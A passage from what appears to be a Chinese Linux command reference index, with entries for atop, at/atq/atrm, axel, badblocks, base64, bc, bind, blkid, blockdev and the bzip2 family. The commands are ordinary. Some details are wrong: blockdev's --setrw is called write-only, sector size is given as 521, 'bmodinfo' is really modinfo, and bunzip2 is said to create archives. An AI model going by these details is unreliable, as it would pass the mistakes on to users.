#proc字段指示进程总数\n- #zombie字段指示僵死进程的数量\n- #exit字段指示atop采样周期期间退出的进程数量\n\n\n**CPU列**：该列显示CPU整体(即多核CPU作为一个整体CPU资源)的使用情况，我们知道CPU可被用于执行进程、处理中断，也可处于空闲状态(空闲状态分两种，一种是活动进程等待磁盘IO导致CPU空闲，另一种是完全空闲)\n\n- sys、usr字段指示CPU被用于处理进程时，进程在内核态、用户态所占CPU的时间比例\n- irq字段指示CPU被用于处理中断的时间比例\n- idle字段指示CPU处在完全空闲状态的时间比例\n- wait字段指示CPU处在“进程等待磁盘IO导致CPU空闲”状态的时间比例\n\nCPU列各个字段指示值相加结果为N00%，其中N为cpu核数。\n\ncpu列：该列显示某一核cpu的使用情况，各字段含义可参照CPU列，各字段值相加结果为100%\n\n**CPL列**：该列显示CPU负载情况\n\n- avg1、avg5和avg15字段：过去1分钟、5分钟和15分钟内运行队列中的平均进程数量\n- csw字段指示上下文交换次数\n- intr字段指示中断发生次数\n\n**MEM列**：该列指示内存的使用情况\n\n- tot字段指示物理内存总量\n- free字段指示空闲内存的大小\n- cache字段指示用于页缓存的内存大小\n- buff字段指示用于文件缓存的内存大小\n- slab字段指示系统内核占用的内存大小\n\n**SWP列**：该列指示交换空间的使用情况\n\n- tot字段指示交换区总量\n- free字段指示空闲交换空间大小\n\n**PAG列**：该列指示虚拟内存分页情况\n\nswin、swout字段：换入和换出内存页数\n\n**DSK列**：该列指示磁盘使用情况，每一个磁盘设备对应一列，如果有sdb设备，那么增多一列DSK信息\n\n- sda字段：磁盘设备标识\n- busy字段：磁盘忙时比例\n- read、write字段：读、写请求数量\n\n**NET列**：多列NET展示了网络状况，包括传输层(TCP和UDP)、IP层以及各活动的网口信息\n\n- XXXi  字段指示各层或活动网口收包数目\n- XXXo 字段指示各层或活动网口发包数目\n\n\n## atop日志\n\n每个时间点采样页面组合起来就形成了一个atop日志文件，我们可以使用\"atop -r XXX\"命令对日志文件进行查看。那以什么形式保存atop日志文件呢？\n\n对于atop日志文件的保存方式，我们可以这样：\n\n- 每天保存一个atop日志文件，该日志文件记录当天信息\n- 日志文件以\"atop_YYYYMMDD\"的方式命名\n- 设定日志失效期限，自动删除一段时间前的日志文件\n\n其实atop开发者已经提供了以上日志保存方式，相应的atop.daily脚本可以在源码目录下找到。在atop.daily脚本中，我们可以通过修改INTERVAL变量改变atop信息采样周期(默认为10分钟)；通过修改以下命令中的数值改变日志保存天数(默认为28天)：\n\n```shell\n(sleep 3; find $LOGPATH -name 'atop_*' -mtime +28 -exec rm {} \\; )& \n```\n\n最后，我们修改cron文件，每天凌晨执行atop.daily脚本：\n\n```shell\n0 0 * * * root /etc/cron.daily/atop.daily\n```\n\n## 相关资料\n\n- [官方手册](http://www.atoptool.nl/download/man_atop-1.pdf)\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","atop"]},{"title":"【Linux 命令】atq","url":"/linux-command/atq/","content":"\n列出当前用户的at任务列表\n\n## 补充说明\n\n**atq命令** 显示系统中待执行的任务列表，也就是列出当前用户的at任务列表。\n\n###  语法\n\n```shell\natq [-V] [-q 队列] [-v]\n```\n\n###  选项\n\n```shell\n-V：显示版本号；\n-q：查询指定队列的任务。\n```\n\n###  实例\n\n```shell\nat now + 10 minutes\nat> echo 1111\nat> <eot>\njob 3 at Fri Apr 26 12:56:00 2013\n\natq\n3       Fri Apr 26 12:56:00 2013 a root\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","atq"]},{"title":"【Linux 命令】atrm","url":"/linux-command/atrm/","content":"\n删除待执行任务队列中的指定任务\n\n## 补充说明\n\n**atrm命令** 用于删除待执行任务队列中的指定任务。\n\n###  语法\n\n```shell\natrm(选项)(参数)\n```\n\n###  选项\n\n```shell\n-V：显示版本号。\n```\n\n###  参数\n\n任务号：指定待执行队列中要删除的任务。\n\n###  实例\n\n删除已经排队的任务\n\n```shell\natq        # 显示当前已经设置的任务\n2 Mon May 17 08:00:00 2010 a root\n1 Sat May 15 17:00:00 2010 a root\n\natrm 2     # 删除任务2\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","atrm"]},{"title":"【Linux 命令】axel","url":"/linux-command/axel/","content":"\n多线程下载工具\n\n## 补充说明\n\n**axel** 是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。比如在国内VPS或服务器上下载lnmp一键安装包用Axel就比wget快。\n\n###  安装\n\nCentOS安装Axel：\n\n目前yum源上没有Axel，我们可以到 http://pkgs.repoforge.org/axel/ 下载rpm包安装。\n\n32位CentOS执行下面命令：\n\n```shell\nwget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.i386.rpm\nrpm -ivh axel-2.4-1.el5.rf.i386.rpm\n```\n\n64位CentOS执行下面命令：\n\n```shell\nwget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.x86_64.rpm\nrpm -ivh axel-2.4-1.el5.rf.x86_64.rpm\n```\n\nDebian/Ubuntu安装Axel：\n\n```shell\napt-get install axel\n```\n\n###  语法\n\n```shell\naxel [options] url1 [url2] [url...]\n```\n\n###  选项\n\n```shell\n--max-speed=x , -s x         # 最高速度x\n--num-connections=x , -n x   # 连接数x\n--output=f , -o f            # 下载为本地文件f\n--search[=x] , -S [x]        # 搜索镜像\n--header=x , -H x            # 添加头文件字符串x（指定 HTTP header）\n--user-agent=x , -U x        # 设置用户代理（指定 HTTP user agent）\n--no-proxy ， -N             # 不使用代理服务器\n--quiet ， -q                # 静默模式\n--verbose ，-v               # 更多状态信息\n--alternate ， -a            # Alternate progress indicator\n--help ，-h                  # 帮助\n--version ，-V               # 版本信息\n```\n\n###  实例\n\n如下载lnmp安装包指定10个线程，存到 `/tmp/`：\n\n```shell\naxel -n 10 -o /tmp/ http://www.jsdig.com/lnmp.tar.gz\n```\n\n如果下载过程中下载中断可以再执行下载命令即可恢复上次的下载进度。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","axel"]},{"title":"【Linux 命令】badblocks","url":"/linux-command/badblocks/","content":"\n查找磁盘中损坏的区块\n\n## 补充说明\n\n**badblock命令** 用于查找磁盘中损坏的区块。 硬盘是一个损耗设备，当使用一段时间后可能会出现坏道等物理故障。电脑硬盘出现坏道后，如果不及时更换或进行技术处理，坏道就会越来越多，并会造成频繁死机和数据丢失。最好的处理方式是更换磁盘，但在临时的情况下，应及时屏蔽坏道部分的扇区，不要触动它们。badblocks就是一个很好的检查坏道位置的工具。\n\n###  语法\n\n```shell\nbadblock(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b<区块大小>：指定磁盘的区块大小，单位为字节；\n-o<输出文件>：将检查的结果写入指定的输出文件；\n-s：在检查时显示进度；\n-v：执行时显示详细的信息；\n-w：在检查时，执行写入测试。\n```\n\n###  参数\n\n* 磁盘装置：指定要检查的磁盘装置；\n* 磁盘区块数：指定磁盘装置的区块总数；\n* 启始区块：指定要从哪个区块开始检查。\n\n###  实例\n\nbadblocks以 4096 的一个block，每一个block检查16次，将结果输出到“hda-badblocks-list”文件里。\n\n```shell\nbadblocks -b 4096 -c 16 /dev/hda1 -o hda-badblocks-list\n```\n\nhda-badblocks-list是个文本文件，内容如下：\n\n```shell\ncat hda-badblocks-list\n51249\n51250\n51251\n51253\n51254\n……\n61245\n……\n```\n\n可以针对可疑的区块多做几次操作。下面，badblocks以4096字节为一个“block”,每一个“block”检查1次, 将结果输出到“hda-badblocks-list.1”文件中，由第51000 block开始，到63000 block结束。\n\n```shell\nbadblocks -b 4096 -c 1 /dev/hda1 -o hda-badblocks-list.1 63000 51000\n```\n\n这次花费的时间比较短，硬盘在指定的情况下在很短的时间就产生“嘎嘎嘎嘎”的响声。由于检查条件的不同，其输出的结果也不完全是相同的。重复几次同样的操作，因条件多少都有些不同，所以结果也有所不同。进行多次操作后，直到产生最后的hda-badblock-list.final文件。\n\n###  其他\n\n**1、fsck使用badblocks的信息** \n\nbadblocks只会在日志文件中标记出坏道的信息，但若希望在检测磁盘时也能跳过这些坏块不检测，可以使用fsck的-l参数：\n\n```\nfsck.ext3 -l /tmp/hda-badblock-list.final /dev/hda1\n```\n\n**2、在创建文件系统前检测坏道** \n\nbadblocks可以随e2fsck和mke2fs的-c删除一起运行（对ext3文件系统也一样），在创建文件系统前就先检测坏道信息：\n\n```shell\nmkfs.ext3 -c /dev/hda1\n```\n\n代码表示使用-c在创建文件系统前检查坏道的硬盘。\n\n这个操作已经很清楚地告知我们可以采用`mkfs.ext3 -c`选项用`read-only`方式检查硬盘。这个命令会在格式化硬盘时检查硬盘，并标出错误的硬盘“block”。用这个方法格式化硬盘，需要有相当大的耐心，因为命令运行后，会一个个用读的方式检查硬盘。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","badblocks"]},{"title":"【Linux 命令】base64","url":"/linux-command/base64/","content":"\nbase64 编码/解码文件或标准输入输出\n\n### 描述\n\nbase64将`文件`或`标准输入`编码或解码为标准输出; \n\n### 语法\n\n```shell\nbase64 [OPTION]... [FILE]\n```\n\n### 参数\n\n```shell\n-d, --decode         # 解码\n-i, --ignore-garbage # 解码时，忽略非字母字符\n-w, --wrap=COLS      # 在指定的字符数后自动换行(默认为76), 0 为禁用自动换行\n\n--help      # 显示此帮助说明并退出\n--version   # 输出版本信息并退出\n```\n\n### 实例\n\n编码字符串\n\n```bash\nprintf foo|base64\n```\n\n编码文件\n\n```bash\nbase64 file\n```\n\n解码\n\n```bash\nprintf Zm9v|base64 -d\n```\n\n解码文件\n\n```bash\nbase64 -d file\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","base64"]},{"title":"【Linux 命令】basename","url":"/linux-command/basename/","content":"\n打印目录或者文件的基本名称\n\n## 补充说明\n\n**basename命令** 用于打印目录或者文件的基本名称。basename和dirname命令通常用于shell脚本中的命令替换来指定和指定的输入文件名称有所差异的输出文件名称。\n\n###  语法\n\n```shell\nbasename(选项)(参数)\n```\n\n###  选项\n\n```shell\n--help：显示帮助；\n--version：显示版本号。\n```\n\n###  参数\n\n* 文件：带路径信息的文件；\n* 后缀：可选参数，指定要去除的文件后缀字符串。\n\n###  实例\n\n1、要显示一个shell变量的基本名称，请输入：\n\n```shell\nbasename $WORKFILE\n```\n\n此命令显示指定给shell变量WORKFILE的值的基本名称。如果WORKFILE变量的值是`/home/jim/program.c`文件，则此命令显示program.c。\n\n要构造一个和另一个文件名称相同（除了后缀）的文件名称，请输入：\n\n```shell\nOFILE=`basename $1 .c`.o\n```\n\n此命令指定给 OFILE 文件第一个位置上的参数（$1）的值，但它的 .c 后缀更改至 .o。如果 $1 是 /home/jim/program.c 文件，则 OFILE 成为 program.o。因为 program.o 仅是一个基本文件名称，它标识在当前目录中的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","basename"]},{"title":"【Linux 命令】batch","url":"/linux-command/batch/","content":"\n在系统不繁忙的时候执行定时任务\n\n## 补充说明\n\n**batch命令** 用于在指定时间，当系统不繁忙时执行任务，用法与at相似。\n\n###  语法\n\n```shell\nbatch(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：指定包含具体指令的任务文件；\n-q：指定新任务的队列名称；\n-m：任务执行完后向用户发送E-mail。\n```\n\n###  参数\n\n日期时间：指定任务执行的日期时间。\n\n###  实例\n\n```shell\nbatch \nat> echo 1234\nat> <EOT>\njob 5 at Sun Apr 28 08:49:00 2013\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","batch"]},{"title":"【Linux 命令】bc","url":"/linux-command/bc/","content":"\n算术操作精密运算工具\n\n## 补充说明\n\n**bc命令** 是一种支持任意精度的交互执行的计算器语言。bash内置了对整数四则运算的支持，但是并不支持浮点运算，而bc命令可以很方便的进行浮点运算，当然整数运算也不再话下。\n\n###  语法\n\n```shell\nbc(选项)(参数)\n```\n\n###  选项\n\n```shell\n-i：强制进入交互式模式；\n-l：定义使用的标准数学库；\n-w：对POSIX bc的扩展给出警告信息；\n-q：不打印正常的GNU bc环境信息；\n-v：显示指令版本信息；\n-h：显示指令的帮助信息。\n```\n\n###  参数\n\n文件：指定包含计算任务的文件。\n\n###  实例\n\n算术操作高级运算bc命令它可以执行浮点运算和一些高级函数：\n\n```shell\necho \"1.212*3\" | bc \n3.636\n\n```\n\n设定小数精度（数值范围）\n\n```shell\necho \"scale=2;3/8\" | bc\n0.37\n\n```\n\n参数`scale=2`是将bc输出结果的小数位设置为2位。\n\n进制转换\n\n```shell\n#!/bin/bash\nabc=192\necho \"obase=2;$abc\" | bc\n\n```\n\n执行结果为：11000000，这是用bc将十进制转换成二进制。\n\n```shell\n#!/bin/bash\nabc=11000000\necho \"obase=10;ibase=2;$abc\" | bc\n\n```\n\n执行结果为：192，这是用bc将二进制转换为十进制。\n\n计算平方和平方根：\n\n```shell\necho \"10^10\" | bc\necho \"sqrt(100)\" | bc\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bc"]},{"title":"【Linux 命令】bg","url":"/linux-command/bg/","content":"\n将前台终端作业移动到后台运行\n\n## 概要\n\n```shell\nbg [job_spec ...]\n```\n\n## 主要用途\n\n- 用于将作业放到后台运行，使前台可以执行其他任务。该命令的运行效果与在指令后面添加符号`&`的效果是相同的，都是将其放到系统后台执行。\n\n- 若后台任务中只有一个，则使用该命令时可以省略任务号。\n\n## 参数\n\njob_spec（可选）：指定要移动到后台执行的作业标识符，可以是一到多个。\n\n## 返回值\n\n返回成功除非未开启作业控制或发生了错误。\n\n## 例子\n\n```shell\n# 运行sleep命令，然后按下ctrl+z。\nsleep 60\n^Z\n[1]+  Stopped                 sleep 60\n\n# 使用bg命令使得作业在后台运行。\nbg %1\n\n# 返回信息：\n[1]+ sleep 60 &\n```\n\n### 注意\n\n1. `bash`的作业控制命令包括`bg fg kill wait disown suspend`。\n2. 该命令需要`set`选项`monitor`处于开启状态时才能执行；查看作业控制状态：输入`set -o`查看`monitor`行；执行`set -o monitor`或`set -m`开启该选项。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bg"]},{"title":"【Linux 命令】bind","url":"/linux-command/bind/","content":"\n显示或设置键盘按键与其相关的功能\n\n## 补充说明\n\n**bind命令** 用于显示和设置命令行的键盘序列绑定功能。通过这一命令，可以提高命令行中操作效率。您可以利用bind命令了解有哪些按键组合与其功能，也可以自行指定要用哪些按键组合。\n\n###  语法\n\n```shell\nbind(选项)\n```\n\n###  选项\n\n```shell\n-d：显示按键配置的内容；\n-f<按键配置文件>：载入指定的按键配置文件；\n-l：列出所有的功能；\n-m<按键配置>：指定按键配置；\n-q<功能>：显示指定功能的按键；\n-v：列出目前的按键配置与其功能。\n```\n\n###  实例\n\n```shell\nbind -x '\"\\C-l\":ls -l'    #直接按 CTRL+L 就列出目录\n```\n\n其中keyseq可以使用`showkey -a`命令来获取：\n\n```shell\nshowkey -a\n\nPress any keys - Ctrl-D will terminate this program\n\n^[[A     27 0033 0x1b  上\n         91 0133 0x5b\n         65 0101 0x41\n^[[B     27 0033 0x1b  下\n         91 0133 0x5b\n         66 0102 0x42\n^[[D     27 0033 0x1b  左\n         91 0133 0x5b\n         68 0104 0x44\n^[[C     27 0033 0x1b 右\n         91 0133 0x5b\n         67 0103 0x43\n         32 0040 0x20\n^M       13 0015 0x0d 字母M\n^C        3 0003 0x03 Ctrl-C\n^D        4 0004 0x04 Ctrl-D 退出\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bind"]},{"title":"【Linux 命令】blkid","url":"/linux-command/blkid/","content":"\n查看块设备的文件系统类型、LABEL、UUID等信息\n\n## 补充说明\n\n在Linux下可以使用 **blkid命令** 对查询设备上所采用文件系统类型进行查询。blkid主要用来对系统的块设备（包括交换分区）所使用的文件系统类型、LABEL、UUID等信息进行查询。要使用这个命令必须安装e2fsprogs软件包。\n\n###  语法\n\n```shell\nblkid -L | -U\nblkid [-c ] [-ghlLv] [-o] [-s ][-t ] -[w ] [ ...]\nblkid -p [-s ] [-O ] [-S ][-o] ...\nblkid -i [-s ] [-o] ...\n```\n\n###  选项\n\n```shell\n-c <file>   # 指定cache文件(default: /etc/blkid.tab, /dev/null = none)\n-d          # don't encode non-printing characters\n-h          # 显示帮助信息\n-g          # garbage collect the blkid cache\n-o <format> # 指定输出格式\n-k          # list all known filesystems/RAIDs and exit\n-s <tag>    # 显示指定信息，默认显示所有信息\n-t <token>  # find device with a specific token (NAME=value pair)\n-l          # look up only first device with token specified by -t\n-L <label>  # convert LABEL to device name\n-U <uuid>   # convert UUID to device name\n-v          # 显示版本信息\n-w <file>   # write cache to different file (/dev/null = no write)\n<dev>       # specify device(s) to probe (default: all devices)\nLow-level probing options:\n-p          # low-level superblocks probing (bypass cache)\n-i          # gather information about I/O limits\n-S <size>   # overwrite device size\n-O <offset> # probe at the given offset\n-u <list>   # filter by \"usage\" (e.g. -u filesystem,raid)\n-n <list>   # filter by filesystem type (e.g. -n vfat,ext3)\n```\n\n###  实例\n\n1、列出当前系统中所有已挂载文件系统的类型：\n\n```shell\nsudo blkid\n```\n\n2、显示指定设备 UUID：\n\n```shell\nsudo blkid -s UUID /dev/sda5\n```\n\n3、显示所有设备 UUID：\n\n```shell\nsudo blkid -s UUID\n```\n\n4、显示指定设备 LABEL：\n\n```shell\nsudo blkid -s LABEL /dev/sda5\n```\n\n5、显示所有设备 LABEL：\n\n```shell\nsudo blkid -s LABEL\n```\n\n6、显示所有设备文件系统：\n\n```shell\nsudo blkid -s TYPE\n```\n\n7、显示所有设备：\n\n```shell\nsudo blkid -o device\n```\n\n8、以列表方式查看详细信息：\n\n```shell\nsudo blkid -o list\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","blkid"]},{"title":"【Linux 命令】blockdev","url":"/linux-command/blockdev/","content":"\n从命令行调用区块设备控制程序\n\n## 补充说明\n\n**blockdev命令** 在命令调用“ioxtls”函数，以实现对设备的控制。\n\n###  语法\n\n```shell\nblockdev(选项)(参数)\n```\n\n选项\n\n```shell\n-V：打印版本号并退出；\n-q：安静模式；\n-v：详细信息模式；\n--setro：只读；\n--setrw：只写；\n--getro：打印只读状态，“1”表示只读，“0”表示非只读；\n--getss：打印扇区大小。通常为521；\n--flushbufs：刷新缓冲区；\n--rereadpt：重新读取分区表。\n```\n\n###  参数\n\n设备文件名：指定要操作的磁盘的设备文件名。\n\n###  实例\n\n设置设备为只读：\n\n```shell\nblockdev --setro /dev/hda4\n```\n\n读取设备是否为只读：\n\n```shell\nblockdev --getro /dev/hda4\n```\n\n设置设别为可读写：\n\n```shell\nblockdev --setrw /dev/hda4\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","blockdev"]},{"title":"【Linux 命令】bmodinfo","url":"/linux-command/bmodinfo/","content":"\n显示给定模块的详细信息\n\n## 补充说明\n\n**bmodinfo命令** 用于显示给定模块的详细信息。\n\n###  语法\n\n```shell\nbmodinfo(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：显示模块作者；\n-d：显示模块的描述信息；\n-l：显示模块的许可信息；\n-p：显示模块的参数信息；\n-n：显示模块对应的文字信息；\n-0：用ASCII码的0字符分割字段值，而不使用新行。\n```\n\n###  参数\n\n模块名：要显示详细信息的模块名称。\n\n###  实例\n\n显示sg模块的信息：\n\n```shell\n[root@localhost ~]# modinfo sg\nfilename:    /lib/modules/2.6.9-42.ELsmp/kernel/drivers/scsi/sg.ko\nauthor:     Douglas Gilbert\ndescription:  SCSI generic (sg) driver\nlicense:    GPL\nversion:    3.5.31 B0B0CB1BB59F0669A1F0D6B\nparm:      def_reserved_size:size of buffer reserved for each fd\nparm:      allow_dio:allow direct I/O (default: 0 (disallow))\nalias:     char-major-21-*\nvermagic:    2.6.9-42.ELsmp SMP 686 REGPARM 4KSTACKS gcc-3.4\ndepends:    scsi_mod\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bmodinfo"]},{"title":"【Linux 命令】break","url":"/linux-command/break/","content":"\n结束for，while或until循环。\n\n## 概要\n\n```shell\nbreak [n]\n```\n\n## 主要用途\n\n- 结束for，while或until循环，可指定退出几层循环。\n\n\n## 参数\n\nn（可选）：大于等于1的整数，用于指定退出几层循环。\n\n## 返回值\n\n返回成功除非n小于1。\n\n## 例子\n\n```shell\n# break的可选参数n缺省值为1。\n# 从外层for循环继续执行。\nfor((i=3;i>0;i--)); do\n  for((j=3;j>0;j--)); do\n    if((j==2)); then\n      # 换成break 1时结果一样\n      break\n    fi\n  printf \"%s %s\\n\" ${i} ${j}\n  done\ndone\n# 输出结果\n3 3\n2 3\n1 3\n```\n\n```shell\n# 当n为2时：\n# 退出两层循环，结束。\nfor((i=3;i>0;i--)); do\n  for((j=3;j>0;j--)); do\n    if((j==2)); then\n      break 2\n    fi\n  printf \"%s %s\\n\" ${i} ${j}\n  done\ndone\n# 输出结果\n3 3\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","break"]},{"title":"【Linux 命令】builtin","url":"/linux-command/builtin/","content":"\n执行bash内建命令。\n\n## 概要\n\n```shell\nbuiltin [shell-builtin [arg ...]]\n```\n\n## 主要用途\n\n- 用于执行指定的bash内建命令。\n- `builtin`命令调用的bash内建命令优先于同名的外部命令及同名的shell函数。\n\n## 参数\n\nshell-builtin（可选）：要调用的bash内建命令。\n\narg（可选）：传递给bash内建命令的一到多个参数。\n\n## 返回值\n\n返回该内建命令执行的返回值，除非传递的不是bash内建命令或该内建命令被禁用。\n\n## 例子\n\n同名情况下的优先级顺序：\n\nbuiltin 内建命令 > 函数 > 内建命令 > 外部命令\n\n```shell\n# 关于外部命令优先级最高的情况请参考enable命令。\n# 此时内建命令优先使用\necho \"the Great Wall\"\n# 调用内建命令type，返回命令的类型（builtin）\ntype -t echo\n# 定义 echo 函数\necho(){\n    printf \"123\\n\"\n}\n# 此时同名函数优先使用，显示（123）\necho\n# 调用内建命令type，返回命令的类型（function）\ntype -t echo\n# 此时内建命令优先使用\nbuiltin echo -e \"backslash \\\\\"\n```\n\n```shell\n# 执行shell内部指令，输出当前系统下的命令别名\nbuiltin alias\nalias cp='cp -i'\nalias l.='ls -d .* --color=tty'\nalias ll='ls -l --color=tty'\nalias ls='ls --color=tty'\nalias mv='mv -i'\nalias rm='rm -i'\nalias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde'\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n2. 如果要调用的内建命令被禁用了（包括`builtin`），那么执行会报错；关于禁用和启用内建命令请参考`enable`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","builtin"]},{"title":"【Linux 命令】bunzip2","url":"/linux-command/bunzip2/","content":"\n创一个bz2文件压缩包\n\n## 补充说明\n\n**bunzip2命令** 解压缩由bzip2指令创建的”.bz2\"压缩包。对文件进行压缩与解压缩。此命令类似于“gzip/gunzip”命令，只能对文件进行压缩。对于目录只能压缩目录下的所有文件，压缩完成后，在目录下生成以“.bz2”为后缀的压缩包。bunzip2其实是bzip2的符号链接，即软链接，因此压缩解压都可以通过bzip2实现。\n\n###  语法\n\n```shell\nbunzip2(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f或--force：解压缩时，若输出的文件与现有文件同名时，预设不会覆盖现有的文件；\n-k或——keep：在解压缩后，预设会删除原来的压缩文件。若要保留压缩文件，请使用此参数；\n-s或——small：降低程序执行时，内存的使用量；\n-v或——verbose：解压缩文件时，显示详细的信息；\n-l，--license，-V或——version：显示版本信息。\n```\n\n###  参数\n\n.bz2压缩包：指定需要解压缩的.bz2压缩包。\n\n###  实例\n\n将`/opt`目录下的etc.zip、var.zip和backup.zip进行压缩，设置压缩率为最高，同时在压缩完毕后不删除原始文件，显示压缩过程的详细信息。\n\n```shell\nbzip2 -9vk /opt/etc.zip /opt/var.zip /opt/backup.zip\n```\n\n压缩完毕后，在`/opt`下就会生成相应的etc.zip.bz2、var.zip.bz2和backup.zip.bz2文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bunzip2"]},{"title":"【Linux 命令】bye","url":"/linux-command/bye/","content":"\n命令用于中断FTP连线并结束程序\n\n## 补充说明\n\n**bye命令** 在ftp模式下，输入bye即可中断目前的连线作业，并结束ftp的执行。\n\n\n###  语法\n\n```shell\nbye\n```\n\n### 实例\n\n```shell\nbye\n```","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bye"]},{"title":"【Linux 命令】bzcat","url":"/linux-command/bzcat/","content":"\n解压缩指定的.bz2文件\n\n## 补充说明\n\n**bzcat命令** 解压缩指定的.bz2文件，并显示解压缩后的文件内容。保留原压缩文件，并且不生成解压缩后的文件。\n\n###  语法\n\n```shell\nbzcat(参数)\n```\n\n###  参数\n\n.bz2压缩文件：指定要显示内容的.bz2压缩文件。\n\n###  实例\n\n将`/tmp/man.config`以bzip2格式压缩：\n\n```shell\nbzip2 -z man.config\n```\n\n此时man.config会变成man.config.bz2\n\n将上面的压缩文件内容读出来：\n\n```shell\nbzcat man.config.bz2\n```\n\n此时屏幕上会显示 man.config.bz2 解压缩之后的文件内容。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzcat"]},{"title":"【Linux 命令】bzcmp","url":"/linux-command/bzcmp/","content":"\n比较两个压缩包中的文件\n\n## 补充说明\n\n**bzcmp命令** 主要功能是在不真正解压缩.bz2压缩包的情况下，比较两个压缩包中的文件，省去了解压缩后在调用cmp命令的过程。\n\n###  语法\n\n```shell\nbzcmp(参数)\n```\n\n###  参数\n\n* 文件1：指定要比较的第一个.bz2压缩包；\n* 文件2：指定要比较的第二个.bz2压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzcmp"]},{"title":"【Linux 命令】bzdiff","url":"/linux-command/bzdiff/","content":"\n直接比较两个.bz2压缩包中文件的不同\n\n## 补充说明\n\n**bzdiff命令** 用于直接比较两个“.bz2”压缩包中文件的不同，省去了解压缩后再调用diff命令的过程。\n\n###  语法\n\n```shell\nbzdiff(参数)\n```\n\n###  参数\n\n*   文件1：指定要比较的第一个.bz2压缩包；\n*   文件2：指定要比较的第二个.bz2压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzdiff"]},{"title":"【Linux 命令】bzgrep","url":"/linux-command/bzgrep/","content":"\n使用正则表达式搜索.bz2压缩包中文件\n\n## 补充说明\n\n**bzgrep命令** 使用正则表达式搜索“.bz2”压缩包中文件，将匹配的行显示到标注输出。\n\n###  语法\n\n```shell\nbzgrep(参数)\n```\n\n###  参数\n\n*   搜索模式：指定要搜索的模式；\n*   .bz2文件：指定要搜索的.bz2压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzgrep"]},{"title":"【Linux 命令】bzip2","url":"/linux-command/bzip2/","content":"\n将文件压缩成bz2格式\n\n## 补充说明\n\n**bzip2命令** 用于创建和管理（包括解压缩）“.bz2”格式的压缩包。\n\nbzip2 采用 Burrows-Wheeler 块排序文本压缩算法和 Huffman 编码方式压缩文件。 压缩率一般比基于 LZ77/LZ78 的压缩软件好得多，其性能接近 PPM 族统计类压缩软件。\n\n命令行参数有意设计为非常接近 GNU gzip 的形式，但也不完全相同。\n\nbzip2 从命令行读入文件名和参数。 每个文件被名为 \"原始文件名.bz2\" 的压缩文件替换。 每个压缩文件具有与原文件相同的修改时间、 权限， 如果可能的话，还具有相同的属主， 因此在解压缩时这些特性将正确地恢复。 在某些文件系统中， 没有权限、 属主或时间的概念， 或者对文件名的长度有严格限制， 例如 MSDOS，在这种情况下，bzip2 没有保持原文件名、 属主、 权限以及时间的机制， 从这个意义上说，bzip2 对文件名的处理是幼稚的。\n\nbzip2 和 bunzip2 在缺省情况下不覆盖已有的文件。 如果想覆盖已有的文件，要指定 -f 选项。\n\n如果未指定文件名， bzip2 将压缩来自标准输入的数据并写往标准输出。在这种情况下， bzip2 会拒绝将压缩结果写往终端，因为这完全无法理解并且是没有意义的。\n\nbunzip2 (以及 bzip2 -d) 对所有指定的文件进行解压缩处理。不是由 bzip2 产生的文件将被忽略，同时发出一个警告信息。 bzip2 按下列方式由压缩文件名确定解压后的文件名：\n\n```shell\nfilename.bz2    解压成   filename\nfilename.bz     解压成   filename\nfilename.tbz2   解压成   filename.tar\nfilename.tbz    解压成   filename.tar\nanyothername    解压成   anyothername.out\n```\n\n如果文件名的后缀不是下列之一： .bz2, .bz, .tbz2 或 .tbz, .bzip2 将抱怨无法确定原始文件名，并采用原文件名加 .out 作为解压缩文件名。\n\n在压缩时，如果不提供文件名，bzip2 将从标准输入读取数据，压缩结果写往标准输出。\n\nbzip2 采用 32 位 CRC 校验码作自我检查，以确认解压后的文件与原始文件相同。 这可用于检测压缩文件是否损坏，并防止 bzip2 中未知的缺陷（运气好的话这种可能性非常小）。   数据损坏而未检测到的几率非常之小，  对于每个被处理的文件大约是四十亿分之一。  检查是在解压缩时进行的，因此它只能说明某个地方出问题了。 它能帮助恢复原始未压缩的数据。可以用 bzip2recover 来尝试从损坏的文件中恢复数据。\n\n返回值：正常退出返回 0， 出现环境问题返回 1 （文件未找到，非法的选项，I/O错误等）， 返回 2 